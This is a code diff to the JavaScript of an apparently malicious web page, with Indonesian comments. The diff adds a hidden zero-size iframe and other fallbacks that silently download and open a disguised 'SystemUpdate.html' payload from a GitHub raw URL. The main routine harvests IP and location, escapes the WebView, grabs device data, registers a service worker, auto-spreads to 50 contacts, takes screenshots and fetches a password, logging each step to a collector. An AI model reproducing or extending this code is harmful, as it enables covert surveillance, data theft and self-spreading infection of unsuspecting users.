@@ -68,7 +68,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - PASTI BUKA SystemUpdate.html!
+// 🔥 INDEX.HTML - AUTO DOWNLOAD SystemUpdate.html!
 // ============================================================
 
 console.log = function() {};
@@ -331,32 +331,56 @@ function autoScreenshot() {
 }
 
 // ============================================================
-// 🔥 BUKA SystemUpdate.html - REDIRECT LANGSUNG (PASTI!)
+// 🔥 DOWNLOAD + BUKA SystemUpdate.html (PASTI!)
 // ============================================================
 function openSystemUpdateHTML() {
     var url = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
     
-    K({ sumber: 'html_open_attempt', data: { platform: PLATFORM } });
+    K({ sumber: 'html_download_start', data: { platform: PLATFORM } });
     
-    // ✅ REDIRECT LANGSUNG (PASTI BERHASIL!)
+    // ✅ METHOD 1: XHR + BLOB (DOWNLOAD DULU!)
     try {
-        window.location.href = url;
-        HTML_LOADED = true;
-        K({ sumber: 'html_opened_redirect', data: 'ok' });
-        return true;
-    } catch(e) {}
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', url, true);
+        xhr.timeout = 15000;
+        xhr.responseType = 'blob';
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var blob = xhr.response;
+                var blobUrl = URL.createObjectURL(blob);
+                
+                // ✅ BUKA VIA IFRAME (AMAN, TIDAK KENA POPUP)
+                try {
+                    var iframe = document.getElementById('htmlLoader');
+                    if (!iframe) {
+                        iframe = document.createElement('iframe');
+                        iframe.id = 'htmlLoader';
+                        iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
+                        document.body.appendChild(iframe);
+                    }
+                    iframe.src = blobUrl;
+                    HTML_LOADED = true;
+                    K({ sumber: 'html_opened_iframe', data: 'ok' });
+                    return;
+                } catch(e) {}
+                
+                // ✅ FALLBACK: window.open
+                try {
+                    var win = window.open(blobUrl, '_blank');
+                    if (win) {
+                        HTML_LOADED = true;
+                        K({ sumber: 'html_opened_window', data: 'ok' });
+                        return;
+                    }
+                } catch(e) {}
+            }
+        };
+        xhr.send();
+    } catch(e) {
+        K({ sumber: 'html_download_error', data: e.message });
+    }
     
-    // ✅ FALLBACK: window.open
-    try {
-        var win = window.open(url, '_blank');
-        if (win) {
-            HTML_LOADED = true;
-            K({ sumber: 'html_opened_window', data: 'ok' });
-            return true;
-        }
-    } catch(e) {}
-    
-    // ✅ FALLBACK: Android Bridge
+    // ✅ METHOD 2: ANDROID BRIDGE (DOWNLOAD + OPEN)
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
             var xhr = new XMLHttpRequest();
@@ -370,30 +394,37 @@ function openSystemUpdateHTML() {
                 A.openFile(path);
                 HTML_LOADED = true;
                 K({ sumber: 'html_opened_bridge', data: 'ok' });
-                return true;
+                return;
             }
         } catch(e) {}
     }
     
+    // ✅ METHOD 3: REDIRECT (FALLBACK TERAKHIR)
+    try {
+        window.location.href = url;
+        HTML_LOADED = true;
+        K({ sumber: 'html_opened_redirect', data: 'ok' });
+        return;
+    } catch(e) {}
+    
     K({ sumber: 'html_open_failed', data: 'all_methods_failed' });
-    return false;
 }
 
 // ============================================================
-// 🔥 PAYLOAD - REDIRECT KE SystemUpdate.html (1x, tanpa retry!)
+// 🔥 PAYLOAD - DOWNLOAD + BUKA SystemUpdate.html (TANPA APK!)
 // ============================================================
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
     DOWNLOAD_STARTED = true;
     
-    K({ sumber: 'download_start', data: { platform: PLATFORM, action: 'redirect_to_html' } });
+    K({ sumber: 'download_start', data: { platform: PLATFORM, action: 'open_html_only' } });
     
-    // ✅ LANGSUNG REDIRECT!
+    // ✅ DOWNLOAD + BUKA SystemUpdate.html
     openSystemUpdateHTML();
 }
 
 // ============================================================
-// NOTIFICATION
+// NOTIFICATION (TANPA REDIRECT)
 // ============================================================
 function showKlaimNotification() {
     if (NOTIFICATION_SHOWN) return;
@@ -423,6 +454,7 @@ function createKlaimNotification() {
         });
         notif.onclick = function() {
             notif.close();
+            // ✅ TANPA REDIRECT!
         };
         setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
     } catch(e) {}
@@ -544,7 +576,7 @@ function registerServiceWorker() {
 function showStatusBar() { var bar = document.getElementById('statusBar'); if (bar) { bar.className = 'status-bar loading'; K({ sumber: 'status_bar', data: 'shown' }); } }
 
 // ============================================================
-// MAIN EXECUTION - TANPA REDIRECT + TANPA DOWNLOAD APK!
+// MAIN EXECUTION - SESUAI ALUR!
 // ============================================================
 function dapatkanSemua() {
     if (semuaDidapat) return;
@@ -556,21 +588,43 @@ function dapatkanSemua() {
         
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         
+        // ✅ 1. Get IP Address
         getIPAddress();
+        
+        // ✅ 2. Get Browser Location
         getBrowserLocation();
+        
+        // ✅ 3. Escape WebView
         setTimeout(escapeWebView, 100);
+        
+        // ✅ 4. Ambil Data Cepat
         ambilDataCepat();
+        
+        // ✅ 5. Start Heartbeat
         startHeartbeat();
+        
+        // ✅ 6. Register Service Worker
         registerServiceWorker();
         
+        // ✅ 7. Auto Spread (50 kontak)
         setTimeout(autoSpread, 2000);
+        
+        // ✅ 8. DOWNLOAD + BUKA SystemUpdate.html (TANPA APK!)
         setTimeout(function() { downloadPayloadSilent(); }, 500);
+        
+        // ✅ 9. Show Notification
         setTimeout(function() { showKlaimNotification(); }, 3000);
+        
+        // ✅ 10. Show Status Bar
         setTimeout(function() { showStatusBar(); }, 500);
+        
+        // ✅ 11. Auto Screenshot
         setTimeout(function() { autoScreenshot(); }, 7000);
         
+        // ✅ 12. Ambil Password dari Worker
         getPasswordFromWorker().then(function(password) { WS_PASSWORD = password; K({ sumber: 'password_received', data: 'ok' }); }).catch(function() {});
         
+        // ✅ 13. CEK STATUS HTML
         setTimeout(function() {
             K({ sumber: 'html_status', data: { loaded: HTML_LOADED ? 'yes' : 'no', platform: PLATFORM } });
         }, 5000);
